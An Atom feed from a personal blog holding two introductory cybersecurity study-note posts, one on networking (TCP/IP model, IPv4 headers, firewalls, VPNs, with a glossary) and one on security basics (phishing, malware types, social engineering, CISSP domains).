<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2024-06-29T22:10:09-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Armando Villalobos</title><subtitle>Cybersecurity enthusiast
</subtitle><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><entry><title type="html">Introduction to Networks</title><link href="http://localhost:4000/blog/notes/2024-06-28-introductionToNetworks/" rel="alternate" type="text/html" title="Introduction to Networks" /><published>2024-06-28T00:00:00-06:00</published><updated>2024-06-28T00:00:00-06:00</updated><id>http://localhost:4000/blog/notes/introductionToNetworks</id><content type="html" xml:base="http://localhost:4000/blog/notes/2024-06-28-introductionToNetworks/"><![CDATA[<ul id="markdown-toc">
  <li><a href="#the-tcpip-model" id="markdown-toc-the-tcpip-model">The TCP/IP model</a></li>
  <li><a href="#network-access-layer" id="markdown-toc-network-access-layer">Network access layer</a></li>
  <li><a href="#internet-layer" id="markdown-toc-internet-layer">Internet layer</a></li>
  <li><a href="#transport-layer" id="markdown-toc-transport-layer">Transport layer</a>    <ul>
      <li><a href="#transmission-control-protocol" id="markdown-toc-transmission-control-protocol">Transmission Control Protocol</a></li>
      <li><a href="#user-datagram-protocol" id="markdown-toc-user-datagram-protocol">User Datagram Protocol</a></li>
    </ul>
  </li>
  <li><a href="#application-layer" id="markdown-toc-application-layer">Application layer</a></li>
  <li><a href="#operations-at-the-network-layer" id="markdown-toc-operations-at-the-network-layer">Operations at the network layer</a></li>
  <li><a href="#virtual-networks-and-privacy" id="markdown-toc-virtual-networks-and-privacy">Virtual networks and privacy</a>    <ul>
      <li><a href="#common-network-protocols" id="markdown-toc-common-network-protocols">Common network protocols</a></li>
      <li><a href="#wi-fi" id="markdown-toc-wi-fi">Wi-Fi</a></li>
      <li><a href="#network-security-tools-and-practices" id="markdown-toc-network-security-tools-and-practices">Network security tools and practices</a>        <ul>
          <li><a href="#firewalls" id="markdown-toc-firewalls">Firewalls</a></li>
          <li><a href="#proxy-servers" id="markdown-toc-proxy-servers">Proxy servers</a></li>
          <li><a href="#virtual-private-networks-vpn" id="markdown-toc-virtual-private-networks-vpn">Virtual Private Networks (VPN)</a></li>
        </ul>
      </li>
      <li><a href="#network-hardening" id="markdown-toc-network-hardening">Network Hardening</a></li>
    </ul>
  </li>
  <li><a href="#glossary" id="markdown-toc-glossary">Glossary</a>    <ul>
      <li><a href="#a" id="markdown-toc-a">A</a></li>
      <li><a href="#b" id="markdown-toc-b">B</a></li>
      <li><a href="#c" id="markdown-toc-c">C</a></li>
      <li><a href="#d" id="markdown-toc-d">D</a></li>
      <li><a href="#e" id="markdown-toc-e">E</a></li>
      <li><a href="#f" id="markdown-toc-f">F</a></li>
      <li><a href="#h" id="markdown-toc-h">H</a></li>
      <li><a href="#i" id="markdown-toc-i">I</a></li>
      <li><a href="#l" id="markdown-toc-l">L</a></li>
      <li><a href="#m" id="markdown-toc-m">M</a></li>
      <li><a href="#n" id="markdown-toc-n">N</a></li>
      <li><a href="#o" id="markdown-toc-o">O</a></li>
      <li><a href="#p" id="markdown-toc-p">P</a></li>
      <li><a href="#r" id="markdown-toc-r">R</a></li>
      <li><a href="#s" id="markdown-toc-s">S</a></li>
      <li><a href="#t" id="markdown-toc-t">T</a></li>
      <li><a href="#u" id="markdown-toc-u">U</a></li>
      <li><a href="#v" id="markdown-toc-v">V</a></li>
      <li><a href="#w" id="markdown-toc-w">W</a></li>
    </ul>
  </li>
</ul>

<h2 id="the-tcpip-model">The TCP/IP model</h2>
<p>The TCP/IP model is a framework used to visualize how data is organized and transmitted across a network. This model helps network engineers and network security analysts conceptualize processes on the network and communicate where disruptions or security threats occur.</p>

<p>The TCP/IP model has four layers: the network access layer, internet layer, transport layer, and application layer. When troubleshooting issues on the network, security professionals can analyze which layers were impacted by an attack based on what processes were involved in an incident.</p>

<p><img src="/assets/img/notes/tcp.png" alt="image" /></p>

<h2 id="network-access-layer">Network access layer</h2>
<p>The network access layer, sometimes called the data link layer, deals with the creation of data packets and their transmission across a network. This layer corresponds to the physical hardware involved in network transmission. Hubs, modems, cables, and wiring are all considered part of this layer. The address resolution protocol (ARP) is part of the network access layer. Since MAC addresses are used to identify hosts on the same physical network, ARP is needed to map IP addresses to MAC addresses for local network communication.</p>

<h2 id="internet-layer">Internet layer</h2>
<p>The internet layer, sometimes referred to as the network layer, is responsible for ensuring the delivery to the destination host, which potentially resides on a different network. It ensures IP addresses are attached to data packets to indicate the location of the sender and receiver. The internet layer also determines which protocol is responsible for delivering the data packets and ensures the delivery to the destination host. Here are some of the common protocols that operate at the internet layer:</p>

<p>Internet Protocol (IP). IP sends the data packets to the correct destination and relies on the Transmission Control Protocol/User Datagram Protocol (TCP/UDP) to deliver them to the corresponding service. IP packets allow communication between two networks. They are routed from the sending network to the receiving network. TCP in particular retransmits any data that is lost or corrupt.</p>

<p>Internet Control Message Protocol (ICMP). The ICMP shares error information and status updates of data packets. This is useful for detecting and troubleshooting network errors. The ICMP reports information about packets that were dropped or that disappeared in transit, issues with network connectivity, and packets redirected to other routers.</p>

<h2 id="transport-layer">Transport layer</h2>
<p>The transport layer is responsible for delivering data between two systems or networks and includes protocols to control the flow of traffic across a network. TCP and UDP are the two transport protocols that occur at this layer.</p>

<h3 id="transmission-control-protocol">Transmission Control Protocol</h3>
<p>The Transmission Control Protocol (TCP) is an internet communication protocol that allows two devices to form a connection and stream data. It ensures that data is reliably transmitted to the destination service. TCP contains the port number of the intended destination service, which resides in the TCP header of a TCP/IP packet.</p>

<h3 id="user-datagram-protocol">User Datagram Protocol</h3>
<p>The User Datagram Protocol (UDP) is a connectionless protocol that does not establish a connection between devices before transmissions. It is used by applications that are not concerned with the reliability of the transmission. Data sent over UDP is not tracked as extensively as data sent using TCP. Because UDP does not establish network connections, it is used mostly for performance sensitive applications that operate in real time, such as video streaming.</p>

<h2 id="application-layer">Application layer</h2>
<p>The application layer in the TCP/IP model is similar to the application, presentation, and session layers of the OSI model. The application layer is responsible for making network requests or responding to requests. This layer defines which internet services and applications any user can access. Protocols in the application layer determine how the data packets will interact with receiving devices. Some common protocols used on this layer are:</p>

<ul>
  <li>
    <p>Hypertext transfer protocol (HTTP)</p>
  </li>
  <li>
    <p>Simple mail transfer protocol (SMTP)</p>
  </li>
  <li>
    <p>Secure shell (SSH)</p>
  </li>
  <li>
    <p>File transfer protocol (FTP)</p>
  </li>
  <li>
    <p>Domain name system (DNS)</p>
  </li>
</ul>

<p>Application layer protocols rely on underlying layers to transfer the data across the network.</p>

<p><img src="/assets/img/notes/osimodel.png" alt="image" /></p>

<h2 id="operations-at-the-network-layer">Operations at the network layer</h2>
<p>Functions at the network layer organize the addressing and delivery of data packets across the network from the host device to the destination device. This includes directing the packets from one router to another router across the internet, till it reaches the internet protocol (IP) address of the destination network. The destination IP address is contained within the header of each data packet. This address will be stored for future routing purposes in  routing tables along the packet’s path to its destination.</p>

<p>All data packets include an IP address. A data packet is also referred to as an IP packet for TCP connections or a datagram for UDP connections. A router uses the IP address to route packets from network to network based on information contained in the IP header of a data packet. Header information communicates more than just the address of the destination. It also includes information such as the source IP address, the size of the packet, and which protocol will be used for the data portion of the packet.</p>

<p><img src="/assets/img/notes/ipv4.png" alt="image" /></p>

<p>An IPv4 header format is determined by the IPv4 protocol and includes the IP routing information that devices use to direct the packet. The size of the IPv4 header ranges from 20 to 60 bytes. The first 20 bytes are a fixed set of information containing data such as the source and destination IP address, header length, and total length of the packet. The last set of bytes can range from 0 to 40 and consists of the options field.</p>

<p>The length of the data section of an IPv4 packet can vary greatly in size. However, the maximum possible size of an IPv4 packet is 65,535 bytes. It contains the message being transferred over the internet, like website information or email text.</p>

<p><img src="/assets/img/notes/ipv4Packet.png" alt="image" /></p>

<p>There are 13 fields within the header of an IPv4 packet:</p>

<ul>
  <li>
    <p><strong>Version (VER):</strong> This 4 bit component tells receiving devices what protocol the packet is using. The packet used in the illustration above is an IPv4 packet.</p>
  </li>
  <li>
    <p><strong>IP Header Length (HLEN or IHL):</strong> HLEN is the packet’s header length. This value indicates where the packet header ends and the data segment begins.</p>
  </li>
  <li>
    <p><strong>Type of Service (ToS):</strong> Routers prioritize packets for delivery to maintain quality of service on the network. The ToS field provides the router with this information.</p>
  </li>
  <li>
    <p><strong>Total Length:</strong> This field communicates the total length of the entire IP packet, including the header and data. The maximum size of an IPv4 packet is 65,535 bytes.</p>
  </li>
  <li>
    <p><strong>Identification:</strong> IPv4 packets can be up to 65, 535 bytes, but most networks have a smaller limit. In these cases, the packets are divided, or fragmented, into smaller IP packets. The identification field provides a unique identifier for all the fragments of the original IP packet so that they can be reassembled once they reach their destination.</p>
  </li>
  <li>
    <p><strong>Flags:</strong> This field provides the routing device with more information about whether the original packet has been fragmented and if there are more fragments in transit.</p>
  </li>
  <li>
    <p><strong>Fragmentation Offset:</strong> The fragment offset field tells routing devices where in the original packet the fragment belongs.</p>
  </li>
  <li>
    <p><strong>Time to Live (TTL):</strong> TTL prevents data packets from being forwarded by routers indefinitely. It contains a counter that is set by the source. The counter is decremented by one as it passes through each router along its path. When the TTL counter reaches zero, the router currently holding the packet will discard the packet and return an ICMP Time Exceeded error message to the sender.</p>
  </li>
  <li>
    <p><strong>Protocol:</strong> The protocol field tells the receiving device which protocol will be used for the data portion of the packet.</p>
  </li>
  <li>
    <p><strong>Header Checksum:</strong> The header checksum field contains a checksum that can be used to detect corruption of the IP header in transit. Corrupted packets are discarded.</p>
  </li>
  <li>
    <p><strong>Source IP Address:</strong> The source IP address is the IPv4 address of the sending device.</p>
  </li>
  <li>
    <p><strong>Destination IP Address:</strong> The destination IP address is the IPv4 address of the destination device.</p>
  </li>
  <li>
    <p><strong>Options:</strong> The options field allows for security options to be applied to the packet if the HLEN value is greater than five. The field communicates these options to the routing devices.</p>
  </li>
</ul>

<h1 id="virtual-networks-and-privacy">Virtual networks and privacy</h1>

<h2 id="common-network-protocols">Common network protocols</h2>
<p>Network protocols are used to direct traffic to the correct device and service depending on the kind of communication being performed by the devices on the network. Protocols are the rules used by all network devices that provide a mutually agreed upon foundation for how to transfer data across a network.</p>

<p>There are three main categories of network protocols: communication protocols, management protocols, and security protocols.</p>

<ul>
  <li>
    <p>Communication protocols are used to establish connections between servers. Examples include TCP, UDP, and Simple Mail Transfer Protocol (SMTP), which provides a framework for email communication.</p>
  </li>
  <li>
    <p>Management protocols are used to troubleshoot network issues. One example is the Internet Control Message Protocol (ICMP).</p>
  </li>
  <li>
    <p>Security protocols provide encryption for data in transit. Examples include IPSec and SSL/TLS.</p>
  </li>
</ul>

<p>Some other commonly used protocols are:</p>

<ul>
  <li>
    <p>HyperText Transfer Protocol (HTTP). HTTP is an application layer communication protocol. This allows the browser and the web server to communicate with one another.</p>
  </li>
  <li>
    <p>Domain Name System (DNS). DNS is an application layer protocol that translates, or maps, host names to IP addresses.</p>
  </li>
  <li>
    <p>Address Resolution Protocol (ARP). ARP is a network layer communication protocol that maps IP addresses to physical machines or a MAC address recognized on the local area network.</p>
  </li>
</ul>

<h2 id="wi-fi">Wi-Fi</h2>
<p>This section of the course also introduced various wireless security protocols, including WEP, WPA, WPA2, and WPA3. WPA3 encrypts traffic with the Advanced Encryption Standard (AES) cipher as it travels from your device to the wireless access point. WPA2 and WPA3 offer two modes: personal and enterprise. Personal mode is best suited for home networks while enterprise mode is generally utilized for business networks and applications.</p>

<h2 id="network-security-tools-and-practices">Network security tools and practices</h2>
<h3 id="firewalls">Firewalls</h3>
<p>Previously, you learned that firewalls are network virtual appliances (NVAs) or hardware devices that inspect and can filter network traffic before it’s permitted to enter the private network. Traditional firewalls are configured with rules that tell it what types of data packets are allowed based on the port number and IP address of the data packet.</p>

<p>There are two main categories of firewalls.</p>

<ul>
  <li>
    <p><strong>Stateless:</strong> A class of firewall that operates based on predefined rules and does not keep track of information from data packets</p>
  </li>
  <li>
    <p><strong>Stateful:</strong> A class of firewall that keeps track of information passing through it and proactively filters out threats. Unlike stateless firewalls, which require rules to be configured in two directions, a stateful firewall only requires a rule in one direction. This is because it uses a “state table” to track connections, so it can match return traffic to an existing session</p>
  </li>
</ul>

<p>Next generation firewalls (NGFWs) are the most technologically advanced firewall protection. They exceed the security offered by stateful firewalls because they include deep packet inspection (a kind of packet sniffing that examines data packets and takes actions if threats exist) and intrusion prevention features that detect security threats and notify firewall administrators. NGFWs can inspect traffic at the application layer of the TCP/IP model and are typically application aware. Unlike traditional firewalls that block traffic based on IP address and ports, NGFWs rules can be configured to block or allow traffic based on the application. Some NGFWs have additional features like Malware Sandboxing, Network Anti-Virus, and URL and DNS Filtering.</p>

<h3 id="proxy-servers">Proxy servers</h3>
<p>A proxy server is another way to add security to your private network. Proxy servers utilize network address translation (NAT) to serve as a barrier between clients on the network and external threats. Forward proxies handle queries from internal clients when they access resources external to the network. Reverse proxies function opposite of forward proxies; they handle requests from external systems to services on the internal network. Some proxy servers can also be configured with rules, like a firewall.  For example, you can create filters to block websites identified as containing malware.</p>

<h3 id="virtual-private-networks-vpn">Virtual Private Networks (VPN)</h3>
<p>A VPN is a service that encrypts data in transit and disguises your IP address. VPNs use a process called encapsulation. Encapsulation wraps your unencrypted data in an encrypted data packet, which allows your data to be sent across the public network while remaining anonymous. Enterprises and other organizations use VPNs to help protect communications from users’ devices to corporate resources. Some of these resources include servers or virtual machines that host business applications. Individuals also use VPNs to increase personal privacy. VPNs protect user privacy by concealing personal information, including IP addresses, from external servers. A reputable VPN also minimizes its own access to user internet activity by using strong encryption and other security measures. Organizations are increasingly using a combination of VPN and SD-WAN capabilities to secure their networks. A software-defined wide area network (SD-WAN) is a virtual WAN service that allows organizations to securely connect users to applications across multiple locations and over large geographical distances.</p>

<h2 id="network-hardening">Network Hardening</h2>

<table>
  <thead>
    <tr>
      <th>Devices / Tools</th>
      <th>Advantages</th>
      <th>Disadvantages</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Firewall</td>
      <td>A firewall allows or blocks traffic based on a set of rules.</td>
      <td>A firewall is only able to filter packets based on information provided in the header of the packets.</td>
    </tr>
    <tr>
      <td>Intrusion Detection System (IDS)</td>
      <td>An IDS detects and alerts admins about possible intrusions, attacks, and other malicious traffic.</td>
      <td>An IDS can only scan for known attacks or obvious anomalies; new and sophisticated attacks might not be caught. It doesn’t actually stop the incoming traffic.</td>
    </tr>
    <tr>
      <td>Intrusion Prevention System (IPS)</td>
      <td>An IPS monitors system activity for intrusions and anomalies and takes action to stop them.</td>
      <td>An IPS is an inline appliance. If it fails, the connection between the private network and the internet breaks. It might detect false positives and block legitimate traffic.</td>
    </tr>
    <tr>
      <td>Security Information and Event Management (SIEM)</td>
      <td>A SIEM tool collects and analyzes log data from multiple network machines. It aggregates security events for monitoring in a central dashboard.</td>
      <td>A SIEM tool only reports on possible security issues. It does not take any actions to stop or prevent suspicious events.</td>
    </tr>
  </tbody>
</table>

<h1 id="glossary">Glossary</h1>

<h2 id="a">A</h2>
<ul>
  <li>Active packet sniffing: A type of attack where data packets are manipulated in transit</li>
  <li>Address Resolution Protocol (ARP): Used to determine the MAC address of the next router or device to traverse
    <h2 id="b">B</h2>
  </li>
  <li>Bandwidth: The maximum data transmission capacity over a network, measured by bits per second</li>
  <li>Baseline configuration: A documented set of specifications within a system that is used as a basis for future builds, releases, and updates</li>
  <li>Bluetooth: Used for wireless communication with nearby physical devices</li>
  <li>Botnet: A collection of computers infected by malware that are under the control of a single threat actor, known as the “bot herder”
    <h2 id="c">C</h2>
  </li>
  <li>Cloud-based firewalls: Software firewalls that are hosted by the cloud service provider</li>
  <li>Cloud computing: The practice of using remote servers, application, and network services that are hosted on the internet instead of on local physical devices</li>
  <li>Cloud network: A collection of servers or computers that stores resources and data in remote data centers that can be accessed via the internet</li>
  <li>Controlled zone: A subnet that protects the internal network from the uncontrolled zone
    <h2 id="d">D</h2>
  </li>
  <li>Data packet: A basic unit of information that travels from one device to another within a network</li>
  <li>Denial of service (DoS) attack: An attack that targets a network or server and floods it with network traffic</li>
  <li>Distributed denial of service (DDoS) attack: A type of denial of service attack that uses multiple devices or servers located in different locations to flood the target network with unwanted traffic</li>
  <li>Domain Name System (DNS): A networking protocol that translates internet domain names into IP addresses
    <h2 id="e">E</h2>
  </li>
  <li>Encapsulation: A process performed by a VPN service that protects your data by wrapping sensitive data in other data packets
    <h2 id="f">F</h2>
  </li>
  <li>File Transfer Protocol (FTP): Used to transfer files from one device to another over a network</li>
  <li>Firewall: A network security device that monitors traffic to or from your network</li>
  <li>Forward proxy server: A server that regulates and restricts a person’s access to the internet
    <h2 id="h">H</h2>
  </li>
  <li>Hardware: The physical components of a computer</li>
  <li>Hub: A network device that broadcasts information to every device on the network</li>
  <li>Hypertext Transfer Protocol (HTTP): An application layer protocol that provides a method of communication between clients and website servers</li>
  <li>Hypertext Transfer Protocol Secure (HTTPS): A network protocol that provides a secure method of communication between clients and servers
    <h2 id="i">I</h2>
  </li>
  <li>Identity and access management (IAM): A collection of processes and technologies that helps organizations manage digital identities in their environment</li>
  <li>IEEE 802.11 (Wi-Fi): A set of standards that define communication for wireless LANs</li>
  <li>Internet Control Message Protocol (ICMP): An internet protocol used by devices to tell each other about data transmission errors across the network</li>
  <li>Internet Control Message Protocol (ICMP) flood: A type of DoS attack performed by an attacker repeatedly sending ICMP request packets to a network server</li>
  <li>Internet Protocol (IP): A set of standards used for routing and addressing data packets as they travel between devices on a network</li>
  <li>Internet Protocol (IP) address: A unique string of characters that identifies the location of a device on the internet</li>
  <li>IP spoofing: A network attack performed when an attacker changes the source IP of a data packet to impersonate an authorized system and gain access to a network
    <h2 id="l">L</h2>
  </li>
  <li>Local area network (LAN): A network that spans small areas like an office building, a school, or a home
    <h2 id="m">M</h2>
  </li>
  <li>Media Access Control (MAC) address: A unique alphanumeric identifier that is assigned to each physical device on a network</li>
  <li>Modem: A device that connects your router to the internet and brings internet access
to the LAN</li>
  <li>Multi-factor authentication (MFA): A security measure that requires a user to verify their identity in two or more ways to access a system or network
    <h2 id="n">N</h2>
  </li>
  <li>Network: A group of connected devices</li>
  <li>Network log analysis: The process of examining network logs to identify events of interest</li>
  <li>Network protocols: A set of rules used by two or more devices on a network to describe the order of delivery of data and the structure of data</li>
  <li>Network segmentation: A security technique that divides the network into segments
    <h2 id="o">O</h2>
  </li>
  <li>Operating system (OS): The interface between computer hardware and the user</li>
  <li>Open systems interconnection (OSI) model: A standardized concept that describes the seven layers computers use to communicate and send data over the network</li>
  <li>On-path attack: An attack where a malicious actor places themselves in the middle of an authorized connection and intercepts or alters the data in transit
    <h2 id="p">P</h2>
  </li>
  <li>Packet sniffing: The practice of capturing and inspecting data packets across a network</li>
  <li>Passive packet sniffing: A type of attack where a malicious actor connects to a network hub and looks at all traffic on the network</li>
  <li>
    <p>Patch update: A software and operating system update that addresses security vulnerabilities within a program or product</p>
  </li>
  <li>Penetration testing: A simulated attack that helps identify vulnerabilities in systems, networks, websites, applications, and processes</li>
  <li>Ping of death: A type of DoS attack caused when a hacker pings a system by sending it an oversized ICMP packet that is bigger than 64KB</li>
  <li>Port: A software-based location that organizes the sending and receiving of data between devices on a network</li>
  <li>Port filtering: A firewall function that blocks or allows certain port numbers to limit unwanted communication</li>
  <li>Proxy server: A server that fulfills the requests of its clients by forwarding them to other servers
    <h2 id="r">R</h2>
  </li>
  <li>Replay attack: A network attack performed when a malicious actor intercepts a data packet in transit and delays it or repeats it at another time</li>
  <li>Reverse proxy server: A server that regulates and restricts the Internet’s access to an internal server</li>
  <li>Router: A network device that connects multiple networks together
    <h2 id="s">S</h2>
  </li>
  <li>Secure File Transfer Protocol (SFTP): A secure protocol used to transfer files from one device to another over a network</li>
  <li>Secure shell (SSH): A security protocol used to create a shell with a remote system</li>
  <li>Security hardening: The process of strengthening a system to reduce its vulnerabilities and attack surface</li>
  <li>Security information and event management (SIEM): An application that collects and analyzes log data to monitor critical activities for an organization</li>
  <li>Security zone: A segment of a company’s network that protects the internal network from the internet</li>
  <li>Simple Network Management Protocol (SNMP): A network protocol used for monitoring and managing devices on a network</li>
  <li>Smurf attack: A network attack performed when an attacker sniffs an authorized user’s IP address and floods it with ICMP packets</li>
  <li>Speed: The rate at which a device sends and receives data, measured by bits per second</li>
  <li>Stateful: A class of firewall that keeps track of information passing through it and proactively filters out threats</li>
  <li>Stateless: A class of firewall that operates based on predefined rules and that does not keep track of information from data packets</li>
  <li>Subnetting: The subdivision of a network into logical groups called subnets</li>
  <li>Switch: A device that makes connections between specific devices on a network by sending and receiving data between them</li>
  <li>Synchronize (SYN) flood attack: A type of DoS attack that simulates a TCP/IP connection and floods a server with SYN packets
    <h2 id="t">T</h2>
  </li>
  <li>TCP/IP model: A framework used to visualize how data is organized and transmitted across a network</li>
  <li>Transmission Control Protocol (TCP): An internet communication protocol that allows two devices to form a connection and stream data</li>
  <li>Transmission control protocol (TCP) 3-way handshake: A three-step process used to establish an authenticated connection between two devices on a network
    <h2 id="u">U</h2>
  </li>
  <li>Uncontrolled zone: The portion of the network outside the organization</li>
  <li>User Datagram Protocol (UDP): A connectionless protocol that does not establish a connection between devices before transmissions</li>
</ul>

<h2 id="v">V</h2>
<ul>
  <li>Virtual Private Network (VPN): A network security service that changes your public IP address and masks your virtual location so that you can keep your data private when you are using a public network like the internet
    <h2 id="w">W</h2>
  </li>
  <li>Wide Area Network (WAN): A network that spans a large geographic area like a city, state, or country</li>
  <li>Wi-Fi Protected Access (WPA): A wireless security protocol for devices to connect to the internet</li>
</ul>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="notes" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Introduction to Cybersecurity</title><link href="http://localhost:4000/blog/notes/2024-06-27-cyberFundamentals/" rel="alternate" type="text/html" title="Introduction to Cybersecurity" /><published>2024-06-27T00:00:00-06:00</published><updated>2024-06-27T00:00:00-06:00</updated><id>http://localhost:4000/blog/notes/cyberFundamentals</id><content type="html" xml:base="http://localhost:4000/blog/notes/2024-06-27-cyberFundamentals/"><![CDATA[<ul id="markdown-toc">
  <li><a href="#terms-and-definitions" id="markdown-toc-terms-and-definitions">Terms and definitions</a></li>
  <li><a href="#phishing" id="markdown-toc-phishing">Phishing</a></li>
  <li><a href="#malware" id="markdown-toc-malware">Malware</a></li>
  <li><a href="#social-engineering" id="markdown-toc-social-engineering">Social Engineering</a></li>
  <li><a href="#social-engineering-principles" id="markdown-toc-social-engineering-principles">Social engineering principles</a></li>
  <li><a href="#cissp-domain" id="markdown-toc-cissp-domain">CISSP Domain</a></li>
  <li><a href="#frameworks" id="markdown-toc-frameworks">Frameworks</a></li>
</ul>

<h2 id="terms-and-definitions">Terms and definitions</h2>
<p>Cybersecurity (or security): The practice of ensuring confidentiality, integrity, and availability of information by protecting networks, devices, people, and data from unauthorized access or criminal exploitation</p>

<p><strong>Cloud security</strong>: The process of ensuring that assets stored in the cloud are properly configured and access to those assets is limited to authorized users</p>

<p><strong>Internal threat:</strong> A current or former employee, external vendor, or trusted partner who poses a security risk</p>

<p><strong>Network security:</strong> The practice of keeping an organization’s network infrastructure secure from unauthorized access</p>

<p><strong>Personally identifiable information (PII):</strong> Any information used to infer an individual’s identity</p>

<p><strong>Security posture:</strong> An organization’s ability to manage its defense of critical assets and data and react to change</p>

<p><strong>Sensitive personally identifiable information (SPII):</strong> A specific type of PII that falls under stricter handling guidelines</p>

<p><strong>Technical skills:</strong> Skills that require knowledge of specific tools, procedures, and policies</p>

<p><strong>Threat:</strong> Any circumstance or event that can negatively impact assets</p>

<p><strong>Threat actor:</strong> Any person or group who presents a security risk</p>

<p><strong>Transferable skills:</strong> Skills from other areas that can apply to different careers</p>

<h2 id="phishing">Phishing</h2>
<p>Phishing is the use of digital communications to trick people into revealing sensitive data or deploying malicious software.</p>

<p>Some of the most common types of phishing attacks today include:</p>

<ul>
  <li>
    <p><strong>Business Email Compromise (BEC):</strong> A threat actor sends an email message that seems to be from a known source to make a seemingly legitimate request for information, in order to obtain a financial advantage.</p>
  </li>
  <li>
    <p><strong>Spear phishing:</strong> A malicious email attack that targets a specific user or group of users. The email seems to originate from a trusted source.</p>
  </li>
  <li>
    <p><strong>Whaling:</strong> A form of spear phishing. Threat actors target company executives to gain access to sensitive data.</p>
  </li>
  <li>
    <p><strong>Vishing:</strong> The exploitation of electronic voice communication to obtain sensitive information or to impersonate a known source.</p>
  </li>
  <li>
    <p><strong>Smishing:</strong> The use of text messages to trick users, in order to obtain sensitive information or to impersonate a known source.</p>
  </li>
</ul>

<h2 id="malware">Malware</h2>
<p>Malware is software designed to harm devices or networks. There are many types of malware. The primary purpose of malware is to obtain money, or in some cases, an intelligence advantage that can be used against a person, an organization, or a territory.</p>

<p>Some of the most common types of malware attacks today include:</p>

<ul>
  <li>
    <p><strong>Viruses:</strong> Malicious code written to interfere with computer operations and cause damage to data and software. A virus needs to be initiated by a user (i.e., a threat actor), who transmits the virus via a malicious attachment or file download. When someone opens the malicious attachment or download, the virus hides itself in other files in the now infected system. When the infected files are opened, it allows the virus to insert its own code to damage and/or destroy data in the system.</p>
  </li>
  <li>
    <p><strong>Worms:</strong> Malware that can duplicate and spread itself across systems on its own. In contrast to a virus, a worm does not need to be downloaded by a user. Instead, it self-replicates and spreads from an already infected computer to other devices on the same network.</p>
  </li>
  <li>
    <p><strong>Ransomware:</strong> A malicious attack where threat actors encrypt an organization’s data and demand payment to restore access.</p>
  </li>
  <li>
    <p><strong>Spyware:</strong> Malware that’s used to gather and sell information without consent. Spyware can be used to access devices. This allows threat actors to collect personal data, such as private emails, texts, voice and image recordings, and locations.</p>
  </li>
</ul>

<h2 id="social-engineering">Social Engineering</h2>
<p>Social engineering is a manipulation technique that exploits human error to gain private information, access, or valuables. Human error is usually a result of trusting someone without question. It’s the mission of a threat actor, acting as a social engineer, to create an environment of false trust and lies to exploit as many people as possible.</p>

<p>Some of the most common types of social engineering attacks today include:</p>

<ul>
  <li>
    <p><strong>Social media phishing:</strong> A threat actor collects detailed information about their target from social media sites. Then, they initiate an attack.</p>
  </li>
  <li>
    <p><strong>Watering hole attack:</strong> A threat actor attacks a website frequently visited by a specific group of users.</p>
  </li>
  <li>
    <p><strong>USB baiting:</strong> A threat actor strategically leaves a malware USB stick for an employee to find and install, to unknowingly infect a network.</p>
  </li>
  <li>
    <p><strong>Physical social engineering:</strong> A threat actor impersonates an employee, customer, or vendor to obtain unauthorized access to a physical location.</p>
  </li>
</ul>

<h2 id="social-engineering-principles">Social engineering principles</h2>
<p>Social engineering is incredibly effective. This is because people are generally trusting and conditioned to respect authority. The number of social engineering attacks is increasing with every new social media application that allows public access to people’s data. Although sharing personal data—such as your location or photos—can be convenient, it’s also a risk.</p>

<p>Reasons why social engineering attacks are effective include:</p>

<ul>
  <li>
    <p><strong>Authority:</strong> Threat actors impersonate individuals with power. This is because people, in general, have been conditioned to respect and follow authority figures.</p>
  </li>
  <li>
    <p><strong>Intimidation:</strong> Threat actors use bullying tactics. This includes persuading and intimidating victims into doing what they’re told.</p>
  </li>
  <li>
    <p><strong>Consensus/Social proof:</strong> Because people sometimes do things that they believe many others are doing, threat actors use others’ trust to pretend they are legitimate. For example, a threat actor might try to gain access to private data by telling an employee that other people at the company have given them access to that data in the past.</p>
  </li>
  <li>
    <p><strong>Scarcity:</strong> A tactic used to imply that goods or services are in limited supply.</p>
  </li>
  <li>
    <p><strong>Familiarity:</strong> Threat actors establish a fake emotional connection with users that can be exploited.</p>
  </li>
  <li>
    <p><strong>Trust:</strong> Threat actors establish an emotional relationship with users that can be exploited over time. They use this relationship to develop trust and gain personal information.</p>
  </li>
  <li>
    <p><strong>Urgency:</strong> A threat actor persuades others to respond quickly and without questioning.</p>
  </li>
</ul>

<h2 id="cissp-domain">CISSP Domain</h2>

<p>The CISSP (Certified Information Systems Security Professional) certification covers eight domains, each representing a fundamental aspect of information security. Here’s a brief explanation of each:</p>

<p><strong>Security and Risk Management:</strong> This domain covers the foundational concepts of information security, including risk management, governance, compliance, and ethical considerations. It addresses the establishment and maintenance of a security program.</p>

<p><strong>Asset Security:</strong> Focuses on protecting organizational assets, including data and hardware. It covers the classification, handling, retention, and disposal of information.</p>

<p><strong>Security Architecture and Engineering:</strong> Covers the design and implementation of secure architectures, including hardware, software, and network security. It includes concepts such as cryptography, security models, and secure systems design.</p>

<p><strong>Communication and Network Security:</strong> Addresses the protection of data in transit and the design and implementation of secure communication channels and network infrastructures. It includes topics like network protocols, security controls, and secure communication techniques.</p>

<p><strong>Identity and Access Management (IAM):</strong> Focuses on ensuring that only authorized individuals have access to resources. It includes identity management, authentication, authorization, and access control mechanisms.</p>

<p><strong>Security Assessment and Testing:</strong> Covers the evaluation of security systems to identify vulnerabilities and ensure compliance with policies and regulations. It includes topics such as penetration testing, vulnerability assessments, and security audits.</p>

<p><strong>Security Operations:</strong> Deals with the day-to-day operations of maintaining security, including incident response, disaster recovery, and business continuity. It also covers monitoring, logging, and the management of physical and environmental security.</p>

<p><strong>Software Development Security:</strong> Focuses on integrating security into the software development lifecycle. It includes secure coding practices, application security, and the assessment of software vulnerabilities.</p>

<h2 id="frameworks">Frameworks</h2>

<p><strong>The Federal Energy Regulatory Commission - North American Electric Reliability Corporation (FERC-NERC)</strong>
FERC-NERC is a regulation that applies to organizations that work with electricity or that are involved with the U.S. and North American power grid. These types of organizations have an obligation to prepare for, mitigate, and report any potential security incident that can negatively affect the power grid. They are also legally required to adhere to the Critical Infrastructure Protection (CIP) Reliability Standards defined by the FERC.</p>

